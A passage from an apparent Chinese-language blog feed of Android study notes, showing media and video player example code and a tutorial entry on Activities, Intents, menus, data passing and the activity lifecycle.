e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onRequestPermissionsResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-meta">@NonNull</span> String[] permissions, <span class="hljs-meta">@NonNull</span> <span class="hljs-type">int</span>[] grantResults)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults);<br>        <span class="hljs-keyword">switch</span> (requestCode)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span>(grantResults.length&gt;<span class="hljs-number">0</span>&amp;&amp;grantResults[<span class="hljs-number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;<br>                    initMediaPlayer();<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    Toast.makeText(<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;拒绝权限将无法继续使用&quot;</span>,Toast.LENGTH_SHORT).show();<br>                    finish();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.play:<br>                <span class="hljs-keyword">if</span>(!mediaPlayer.isPlaying())&#123;<br>                    mediaPlayer.start();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.stop:<br>                <span class="hljs-keyword">if</span>(mediaPlayer.isPlaying())&#123;<br>                    mediaPlayer.reset();<br>                    initMediaPlayer();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.pause:<br>                <span class="hljs-keyword">if</span>(mediaPlayer.isPlaying())&#123;<br>                    mediaPlayer.pause();<br>                &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onDestroy();<br>        <span class="hljs-keyword">if</span>(mediaPlayer != <span class="hljs-literal">null</span>)&#123;<br>            mediaPlayer.stop();<br>            mediaPlayer.release();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="播放视频"><a href="#播放视频" class="headerlink" title="播放视频"></a>播放视频</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener &#123;<br>    <span class="hljs-keyword">private</span> VideoView videoView;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        videoView = findViewById(R.id.video_view);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">play</span> <span class="hljs-operator">=</span> (Button)findViewById(R.id.play);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">pause</span> <span class="hljs-operator">=</span> (Button)findViewById(R.id.pause);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">replay</span> <span class="hljs-operator">=</span> (Button)findViewById(R.id.replay);<br>        play.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        pause.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        replay.setOnClickListener(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">if</span>(ContextCompat.checkSelfPermission(MainActivity.<span class="hljs-built_in">this</span>,Manifest.permission.WRITE_EXTERNAL_STORAGE)!=<br>                PackageManager.PERMISSION_GRANTED)&#123;<br>            ActivityCompat.requestPermissions(MainActivity.<span class="hljs-built_in">this</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;Manifest.permission.WRITE_EXTERNAL_STORAGE&#125;,<span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            initVideoPath();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initVideoPath</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/storage/emulated/0/Pictures&quot;</span>,<span class="hljs-string">&quot;movie.mp4&quot;</span>);<br>        videoView.setVideoPath(file.getPath());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.play:<br>                <span class="hljs-keyword">if</span>(!videoView.isPlaying())&#123;<br>                    videoView.start();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.pause:<br>                <span class="hljs-keyword">if</span>(videoView.isPlaying())&#123;<br>                    videoView.pause();<br>                &#125;<br>            <span class="hljs-keyword">case</span> R.id.replay:<br>                <span class="hljs-keyword">if</span>(videoView.isPlaying())&#123;<br>                    videoView.resume();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onRequestPermissionsResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-meta">@NonNull</span> String[] permissions, <span class="hljs-meta">@NonNull</span> <span class="hljs-type">int</span>[] grantResults)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (requestCode)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span>(grantResults.length&gt;<span class="hljs-number">0</span>&amp;&amp;grantResults[<span class="hljs-number">0</span>]==PackageManager.PERMISSION_GRANTED)&#123;<br>                    initVideoPath();<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;拒绝权限无法使用程序&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onDestroy();<br>        <span class="hljs-keyword">if</span>(videoView!=<span class="hljs-literal">null</span>)&#123;<br>            videoView.suspend();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android第一行代码--活动</title>
    <link href="/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E6%B4%BB%E5%8A%A8/"/>
    <url>/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E6%B4%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h1><h2 id="什么是Activity"><a href="#什么是Activity" class="headerlink" title="什么是Activity?"></a>什么是Activity?</h2><p><code>Activity</code>包含用户组件用于与用户进行交互。</p><h2 id="onCreate-方法"><a href="#onCreate-方法" class="headerlink" title="onCreate()方法"></a>onCreate()方法</h2><p>每个<code>Activity</code>都需要继承父类的<code>OnCreate()</code>方法</p><h2 id="setContentView-方法"><a href="#setContentView-方法" class="headerlink" title="setContentView()方法"></a>setContentView()方法</h2><p>给当前的活动加载一个布局</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">setContentView(布局文件的id);<br></code></pre></td></tr></table></figure><p>项目中添加任何资源都会在<code>R</code>文件中生成一个相应的资源<code>id</code></p><h2 id="布局文件涉及的元素"><a href="#布局文件涉及的元素" class="headerlink" title="布局文件涉及的元素"></a>布局文件涉及的元素</h2><ul><li><code>Button</code>：插入一个按钮</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> /&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>android:id=@+id/id_name</code>:定义一个名为<code>id_name</code>的<code>id</code></li><li><code>android:id=@id/id_name</code>:引用一个名为<code>id_name</code>的<code>id</code></li><li><code>android:layout_width</code>:指定当前元素的宽度</li><li><code>andorid:layout_height</code>:指定当前元素的高度</li><li><code>match_parent</code>:当前元素与父元素一样宽</li><li><code>android:text</code>:指定元素内显示的文字内容</li><li><code>wrap_content</code>:当前元素的高度&#x2F;宽度刚好能够包含内容</li></ul><h2 id="AndroidManifest文件中注册"><a href="#AndroidManifest文件中注册" class="headerlink" title="AndroidManifest文件中注册"></a>AndroidManifest文件中注册</h2><ul><li><p>活动注册声明需要放在<code>&lt;application&gt;</code>标签内</p></li><li><p>通过<code>&lt;activity&gt;</code>标签进行注册</p><ul><li><code>andorid:name</code>指定注册的<code>activity</code></li><li>由于<code>&lt;manifest&gt;</code>标签已经标明程序包名，因此使用<code>.FirstActivity</code>即可标明<code>activity</code></li><li><code>&lt;intent-filter&gt;</code>标签用于标明哪个活动首先启动，若没有定义主活动，那么该活动无法在启动器中看到或打开，该活动通常作为第三方服务器供其他应用在内部调用。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><code>&lt;android:label&gt;</code>:指定活动中标题栏的内容，标题栏在活动的最顶部</p></li></ul><h2 id="Toast"><a href="#Toast" class="headerlink" title="Toast"></a>Toast</h2><p><code>Toast</code>是<code>Android</code>系统提供的提醒方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Button</span> <span class="hljs-variable">button1</span> <span class="hljs-operator">=</span> (Button) findViewById(R.id.button_1);<br>button1.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        Toast.makeText(FirstActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;You clicked Button 1&quot;</span>, Toast.LENGTH_SHORT).show();<br></code></pre></td></tr></table></figure><ul><li><code>findViewById()</code>方法用于获取在布局文件中定义的元素。<ul><li>返回值:<code>View</code>对象</li></ul></li><li><code>setOnClickListener()</code>方法为按钮注册一个监听器，点击按钮则会执行监听器中的<code>OnClick()</code>方法。</li><li><code>Toast()</code>方法有三个参数<ul><li>参数一:<code>Context</code>即是<code>Toast</code>要求的上下文，活动本身就是一个<code>Context</code>对象，因此将当前活动传入</li><li>参数二:<code>Toast</code>显示的内容</li><li>参数三:显示时长</li></ul></li></ul><h2 id="Menu"><a href="#Menu" class="headerlink" title="Menu"></a>Menu</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">menu</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/add_item&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Add&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">item</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/remove_item&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:title</span>=<span class="hljs-string">&quot;Remove&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">menu</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;item&gt;</code>:用于创建具体的某一个菜单项</li><li><code>android:id</code>:给菜单项指定唯一的标识符</li><li><code>android:title</code>:给这个菜单项指定一个名称</li></ul><h3 id="onCreateOptionsMenu-方法"><a href="#onCreateOptionsMenu-方法" class="headerlink" title="onCreateOptionsMenu()方法"></a>onCreateOptionsMenu()方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onCreateOptionsMenu</span><span class="hljs-params">(Menu menu)</span> &#123;<br>     getMenuInflater().inflate(R.menu.main,menu);<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> &#125;<br></code></pre></td></tr></table></figure><ul><li><code>getMenuInflater()</code>方法用于获取<code>Menuinflate</code>对象</li><li><code>inflate()</code>方法用于给当前活动创建菜单<ul><li>参数一:通过哪个资源文件来创建菜单</li><li>参数二:指定我们的菜单项加载到哪一个<code>Menu</code>对象</li><li>返回值:布尔值<ul><li><code>true</code>代表允许创建的菜单显示出来</li><li><code>false</code>代表菜单无法显示</li></ul></li></ul></li></ul><h3 id="onOptionsItemSelected-方法"><a href="#onOptionsItemSelected-方法" class="headerlink" title="onOptionsItemSelected()方法"></a>onOptionsItemSelected()方法</h3><p>用于判断我们点击的是哪一个菜单项</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onOptionsItemSelected</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MenuItem item)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (item.getItemId())<br>        &#123;<br>            <span class="hljs-keyword">case</span> R.id.add_item:<br>                Toast.makeText(<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;You clicked Add&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.remove_item:<br>                Toast.makeText(<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;You clicked remove&quot;</span>,Toast.LENGTH_SHORT).show();<br>                <span class="hljs-keyword">break</span>;<br>             <span class="hljs-keyword">default</span>:<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="销毁活动"><a href="#销毁活动" class="headerlink" title="销毁活动"></a>销毁活动</h2><ul><li>点击<code>Back</code>键</li><li>使用<code>finsh()</code>方法</li></ul><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p><code>Intent</code>是<code>Android</code>程序中各组件之间进行交互的一种重要方式</p><ul><li>用于指定当前组件想要执行的动作</li><li>在不同组件之间传递数据</li><li>可用于启动活动、服务、广播等场景。</li></ul><h3 id="显式Intent"><a href="#显式Intent" class="headerlink" title="显式Intent"></a>显式Intent</h3><p>构造方法<code>Intent(Context packageContext, Class&lt;?&gt;cls)</code></p><ul><li>第一个参数:启动活动的上下文</li><li>第二个参数:想要启动的目标活动</li></ul><p><code>StartActivity()</code>方法：</p><ul><li>参数一:<code>Intent</code>参数</li><li>用于启动目标活动</li></ul><h3 id="隐式Intent"><a href="#隐式Intent" class="headerlink" title="隐式Intent"></a>隐式Intent</h3><p>隐式<code>Intent</code>不明确指出想要启动哪个活动，而是指定<code>action</code>和<code>category</code>，然后由系统分析哪个<code>Intent</code>，并找出合适的活动。</p><p><code>&lt;activity&gt;</code>标签下配置<code>&lt;intent-filter&gt;</code>内容用于指定活动能够相应的<code>action</code>和<code>category</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.SecondActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.example.activitytest.ACTION_START&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;com.example.activitytest.ACTION_START&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="更多隐式Intent的用法"><a href="#更多隐式Intent的用法" class="headerlink" title="更多隐式Intent的用法"></a>更多隐式Intent的用法</h3><p>隐式<code>Intent</code>不仅可以启动自己程序内的活动，还可以其他程序的活动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(Intent.ACTION_VIEW);<br>intent.setData(Uri.parse(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>));<br>startActivity(intent);<br></code></pre></td></tr></table></figure><ul><li><code>Uri.parse()</code>方法将网址字符串解析成一个<code>Uri</code>对象</li><li><code>setData()</code>方法接受一个<code>Uri</code>对象，用于指定当前<code>Intent</code>正在操作的数据。</li><li><code>&lt;data&gt;</code>标签:用于更加准确地指定当前活动能够响应什么类型地数据。<ul><li><code>android:scheme</code>用于指定数据的协议</li><li><code>android:host</code>指定数据的主机名</li><li><code>android:port</code>指定端口</li><li><code>android:path</code>指定路径</li><li><code>andorid:mimeType</code>:指定处理的数据类型</li></ul></li></ul><h2 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a>向下一个活动传递数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//FirstActivity</span><br><span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello SecondActivity&quot;</span>;<br>.....<br>intent.putExtra(<span class="hljs-string">&quot;extra_data&quot;</span>,data);<br><br><span class="hljs-comment">//SecondActivity</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> getIntent();<br><span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;extra_data&quot;</span>);<br>Log.d(<span class="hljs-string">&quot;SecondActivity&quot;</span>,data);<br></code></pre></td></tr></table></figure><ul><li><p><code>putExtra()</code>用于传递数据</p><ul><li>参数一:键值</li><li>参数二:需要传递的数据</li></ul></li><li><p><code>getIntent()</code>方法用于获取到启动<code>SecondActivity</code>的<code>Intent</code></p></li><li><p><code>getStringExtra()</code>方法用来获取传递的数据</p></li></ul><h2 id="返回数据给上一个活动"><a href="#返回数据给上一个活动" class="headerlink" title="返回数据给上一个活动"></a>返回数据给上一个活动</h2><p><code>startActivityForResult()</code>方法:用于启动活动，与<code>startActivity()</code>方法不同的是该方法可以在活动销毁时返回一个结果给上一个活动。</p><ul><li>参数一:<code>intent</code>对象</li><li>参数二:请求码，用于标识请求的<code>Activity</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//FirstActivity</span><br>...<br>startActivityForResult(intent,<span class="hljs-number">1</span>);<br>...<br><span class="hljs-comment">//SecondActivity</span><br>...<br>intent.putExtra(<span class="hljs-string">&quot;data_return&quot;</span>,<span class="hljs-string">&quot;Hello FirstActivity&quot;</span>);<br>setResult(RESULT_OK,intent);<br>finish();<br></code></pre></td></tr></table></figure><p><code>setResult()</code>方法</p><ul><li>参数一:用于向上一个活动返回处理结果</li><li>参数二:将带有数据的<code>Intent</code>传递回去</li></ul><p>使用<code>startActivityForResult()</code>方法启动的活动，在被销毁时会毁掉上一个活动的<code>onActivityResult()</code>方法，因此需要重写<code>onActivityResult()</code>方法来得到返回的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onActivityResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-type">int</span> resultCode, <span class="hljs-meta">@Nullable</span> Intent data)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (requestCode)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span>(resultCode == RESULT_OK)<br>            &#123;<br>                <span class="hljs-type">String</span>  <span class="hljs-variable">returnedData</span> <span class="hljs-operator">=</span> data.getStringExtra(<span class="hljs-string">&quot;extra_data&quot;</span>);<br>                Log.d(<span class="hljs-string">&quot;FirstActivity&quot;</span>,returnedData);<br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>onActivityResult()</code>方法</p><ul><li>参数一<code>requestCode</code>:启动活动时传入的请求码</li><li>参数二<code>resultCode</code>:返回数据时传入的处理结果</li><li>参数三<code>data</code>:携带返回数据的<code>Intent</code></li></ul><p>当点击<code>Back</code>按键时，需要重写需要销毁活动中的<code>onBackPressed()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBackPressed</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> getIntent();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello MainActivity&quot;</span>;<br>    intent.putExtra(<span class="hljs-string">&quot;extra_data&quot;</span>,data);<br>    setResult(RESULT_OK,intent);<br>    finish();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="活动的生命周期"><a href="#活动的生命周期" class="headerlink" title="活动的生命周期"></a>活动的生命周期</h2><h3 id="返回栈"><a href="#返回栈" class="headerlink" title="返回栈"></a>返回栈</h3><p><code>Android</code>使用任务(<code>Task</code>)来管理活动，一个任务就是一组放在栈里的活动的集合，这个栈被称之为活动栈(<code>Back Stack</code>)。</p><h3 id="活动状态"><a href="#活动状态" class="headerlink" title="活动状态"></a>活动状态</h3><ul><li>运行状态:处于栈顶的活动</li><li>暂停状态:不处于栈顶但是仍然可见</li><li>停止状态:不处于栈顶且不可见，当需要内存时，停止的活动就会被系统回收</li><li>销毁状态:当一个活动移除栈中就处于该状态</li></ul><h3 id="活动的生成期"><a href="#活动的生成期" class="headerlink" title="活动的生成期"></a>活动的生成期</h3><p><code>Activity</code>类定义的7个回调方法对应活动的生命周期</p><ul><li><code>onCreate()</code>:活动第一次被创建时调用，该方法完成初始化操作。</li><li><code>onStart()</code>:该方法由不可见转化为可见时调用</li><li><code>onResume()</code>:该方法在准备好和用户进行交互的时候调用，此时该活动一定处于栈顶</li><li><code>onPause()</code>:这个方法在系统准备启动或者恢复另一个活动的时候调用</li><li><code>onStop()</code>:这个方法在活动完全不可见的时候调用。与<code>onPause()</code>方法的区别在于，若启动一个新的活动是对话框的活动那么<code>onPause()</code>方法会调用但是<code>onStop()</code>方法不会被调用</li><li><code>onDestory()</code>:这个方法在活动被销毁之前调用，之后该活动的状态变为销毁状态</li><li><code>onRestart()</code>:这个方法在活动由停止状态变为运行状态之前调用</li><li>完整生存期:活动在<code>onCreate()</code>方法和<code>onDestory()</code>方法之间所经历的。</li><li>可见生存期:活动在<code>onStart()</code>方法和<code>onStop()</code>方法之间所经历的</li><li>前台生存期:活动在<code>onResume()</code>方法和<code>onPause()</code>方法之间所经历的</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220117175350351.png" alt="image-20220117175350351"></p><h3 id="活动被回收"><a href="#活动被回收" class="headerlink" 